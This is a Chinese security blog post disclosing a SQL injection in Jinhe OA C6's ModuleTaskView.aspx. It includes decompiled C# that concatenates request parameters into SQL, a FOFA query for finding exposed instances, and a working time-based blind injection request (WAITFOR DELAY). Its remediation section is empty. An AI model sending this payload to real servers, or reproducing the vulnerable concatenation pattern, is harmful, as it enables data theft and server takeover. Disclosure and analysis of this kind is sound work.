---
title: "金和OA ModuleTaskView.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-ModuleTaskView-OriginID-sqli.html
asset_dir: assets/金和oa-moduletaskview.aspx-sql注入漏洞
---

# 金和OA ModuleTaskView.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/16 08:28
- 1428浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

SQL

服务器

sql

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ModuleTaskView.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

恶意软件分析工具

Web安全书籍

安全认证考试

根据 ModuleTaskView.aspx 的实现，在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `ModuleTaskView` 的处理逻辑

```
  protected void Page_Load(object sender, EventArgs e)
  {
    this.htc = ((CultureInfo) this.Session["culture"]).Name + ".css";
    this.InitText();
    if (this.Request["OriginModule"] != null)
      this.strOriginModule = this.Request["OriginModule"].ToString();
    if (this.Request["OriginID"] != null)
      this.strOriginID = this.Request["OriginID"].ToString();
    this.GetTaskList();
    this.ListPage1.WidthStyle = UserWebControl.DataGrid.DataGrid.EnumWidthStyle.Fix;
    if (!string.op_Equality(this.strOriginModule, "Approve"))
      return;
    this.ListPage1.ThisHeight = "380";
  }
```

深入探索

云安全解决方案

安全研究报告

计算机安全

再跟进 `GetTaskList` 方法，其实现如下

代码安全审计

```
  private void GetTaskList()
  {
    string str1 = " select a.TaskID,a.TaskNumber,TaskFatherID,a.TaskName,u1.UserName as TaskSendPersonName, " + " a.TaskStartTime,a.TaskEndTime,a.TaskProgress,a.TaskFinishFlag,c.TaskRExecutorSay,c.UserName as ReportorName,c.TaskRRectime,TaskRRecfinprogress,c.ReportFiles" + " from TaskManage a inner join dbo.Users u1 on a.TaskSendPersonID = u1.UserID" + " Left join (select *,dbo.f_TaskReportDoc([ID]) as ReportFiles  from TaskManageExecutorsay A inner join Users B on A.TaskExecutorID=B.UserID)  c on a.TaskID = c.TaskID ";
    string sql;
    if (string.op_Equality(this.strOriginModule, "CRMCustomer"))
    {
      this.ListPage1.Buttons.Clear();
      sql = $"{str1} where a.TaskIsdel = 0  and a.OriginModule = 'CRMExec' and a.OriginID in (select SaleExec_ID from JHCrm_SaleExec where Customer_ID = '{this.strOriginID}') order by c.TaskRRecTime desc";
    }
    else if (string.op_Equality(this.strOriginModule.ToLower(), "crmexec"))
    {
      this.ListPage1.Buttons.Clear();
      sql = $"{str1} where a.TaskIsdel = 0  and a.OriginModule = '{this.strOriginModule}' and a.OriginID = '{this.strOriginID}' order by c.TaskRRecTime desc";
    }
    else
    {
      this.ListPage1.Buttons.Clear();
      this.ListPage1.Buttons.Add("../JHsoft.UI.Lib/images/icon.toolbar/16px/new.png", this.AssignTask);
      sql = $"{str1} where a.TaskIsdel = 0 and  a.OriginModule = '{this.strOriginModule}' and a.OriginID = '{this.strOriginID}' order by c.TaskRRecTime desc";
    }
    DataTable dataTable = Common.ExecSqlReDt(sql);
```

参数 strOriginModule、strOriginID 被直接拼接进SQL语句中后执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

OriginModule=crmexec&OriginID='WAitFor+DelaY'0:0:4'--
```

[![金和OA ModuleTaskView.aspx SQL注入漏洞](images/img-001-835a0e7593d2.webp)](https://image.mrxn.net/9ecd47a12dca4ea8a0600a2157804d5f.webp)

成功延时 4 秒钟

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
